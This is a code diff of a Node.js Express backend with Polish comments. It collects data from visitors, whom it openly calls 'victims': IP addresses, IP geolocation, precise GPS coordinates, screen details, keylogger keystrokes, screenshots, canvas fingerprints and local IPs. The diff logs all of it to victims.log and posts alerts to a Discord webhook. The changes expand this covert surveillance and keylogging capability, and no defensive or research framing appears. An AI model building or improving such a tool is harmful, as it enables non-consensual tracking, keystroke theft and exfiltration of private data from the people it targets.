@@ -1,7 +1,9 @@
 const express = require('express');
 const fs = require('fs');
 const app = express();
-app.use(express.json());
+
+// === ZWIĘKSZONY LIMIT DLA SCREENSHOT (BASE64) ===
+app.use(express.json({ limit: '10mb' }));
 app.use(express.static('public'));
 
 // === KONFIGURACJA DISCORD ===
@@ -16,7 +18,7 @@ app.post('/collect', async (req, res) => {
     data.ip = realIP;
     data.timestamp = new Date().toISOString();
 
-    // Geolokalizacja
+    // === GEOLOKALIZACJA Z IP ===
     let geo = {};
     try {
         const response = await fetch(`http://ip-api.com/json/${realIP}?fields=status,country,regionName,city,zip,lat,lon,isp,org,timezone`);
@@ -34,27 +36,42 @@ app.post('/collect', async (req, res) => {
                 timezone: result.timezone
             };
         }
-    } catch (e) { console.error('Błąd geolokalizacji:', e); }
+    } catch (e) { console.error('Błąd geolokalizacji IP:', e); }
 
-    const fullData = { ...data, geo, headers: { 'user-agent': req.headers['user-agent'], 'accept-language': req.headers['accept-language'], 'referer': req.headers['referer'] || 'direct' } };
+    // === ŁĄCZONE DANE ===
+    const fullData = {
+        ...data,
+        geo: geo,
+        headers: {
+            'user-agent': req.headers['user-agent'],
+            'accept-language': req.headers['accept-language'],
+            'referer': req.headers['referer'] || 'direct'
+        }
+    };
+
+    // === ZAPISZ DO PLIKU (pełny JSON) ===
     fs.appendFileSync('victims.log', JSON.stringify(fullData) + '\n');
     console.log(`Nowa ofiara: ${realIP} | ${geo.city || 'Nieznane miasto'}`);
 
-    // === WYSYŁKA NA DISCORD ===
+    // === WYSYŁKA NA DISCORD (bez screenshot – za duży) ===
     if (DISCORD_WEBHOOK.includes('discord.com')) {
         const embed = {
             embeds: [{
-                title: '🔴 NOWA OFIARA!',
+                title: '🔴 NOWA OFIARA! (DIC v2.0)',
                 color: 0xff0000,
                 fields: [
                     { name: '👤 IP', value: realIP, inline: true },
                     { name: '📍 Miasto', value: geo.city || 'Brak', inline: true },
                     { name: '🌍 Kraj', value: geo.country || 'Brak', inline: true },
-                    { name: '📮 Kod pocztowy', value: geo.zip || 'Brak', inline: true },
+                    { name: '📮 Kod', value: geo.zip || 'Brak', inline: true },
                     { name: '🏢 ISP', value: geo.isp || 'Brak', inline: true },
                     { name: '🖥️ System', value: data.userAgent || 'Brak', inline: true },
                     { name: '📱 Ekran', value: data.screen || 'Brak', inline: true },
-                    { name: '🌐 Geolokalizacja (dokładna)', value: data.location ? `${data.location.lat}, ${data.location.lng}` : 'Brak zgody', inline: true },
+                    { name: '🌐 Geolokacja (dokładna)', value: data.location ? `${data.location.lat}, ${data.location.lng}` : 'Brak zgody', inline: true },
+                    { name: '🔑 Klawisze (keylogger)', value: data.keystrokes ? data.keystrokes.length + ' przechwyconych' : '0', inline: true },
+                    { name: '🖼️ Screenshot', value: data.screenshot ? '✅ Wykonany (w logu)' : '❌ Brak', inline: true },
+                    { name: '🔍 Fingerprint', value: data.canvasFingerprint ? '✅ Wygenerowany' : '❌ Brak', inline: true },
+                    { name: '🌐 Lokalne IP', value: data.localIP || 'Brak', inline: true }
                 ],
                 footer: { text: `Kliknięto: ${data.timestamp}` }
             }]
@@ -71,4 +88,4 @@ app.post('/collect', async (req, res) => {
     res.send('OK');
 });
 
-app.listen(8080, '0.0.0.0', () => console.log('Server running'));
+app.listen(8080, '0.0.0.0', () => console.log('Server running on port 8080'));
